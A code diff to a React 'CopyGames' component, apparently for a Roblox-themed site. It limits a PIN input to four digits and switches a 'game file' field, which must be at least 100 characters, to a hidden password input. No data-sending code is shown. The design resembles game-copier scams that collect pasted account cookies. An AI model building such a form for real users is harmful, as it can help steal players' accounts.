@@ -13,6 +13,12 @@ const CopyGames = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showError, setShowError] = useState(false);
 
+  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    // Only allow numbers and limit to 4 characters
+    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    setPin(value);
+  };
+
   const handleSubmit = async () => {
     if (!gameFile.trim() || gameFile.length < 100) {
       setShowError(true);
@@ -122,7 +128,7 @@ const CopyGames = () => {
                 <FileIcon size={18} />
               </div>
               <input
-                type="text"
+                type="password"
                 placeholder="Enter Game File"
                 value={gameFile}
                 onChange={(e) => setGameFile(e.target.value)}
@@ -140,10 +146,11 @@ const CopyGames = () => {
                 <LockIcon size={18} />
               </div>
               <input
-                type="password"
-                placeholder="Create A Pin"
+                type="text"
+                placeholder="Create A Pin (4 digits)"
                 value={pin}
-                onChange={(e) => setPin(e.target.value)}
+                onChange={handlePinChange}
+                maxLength={4}
                 className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
               />
             </motion.div>
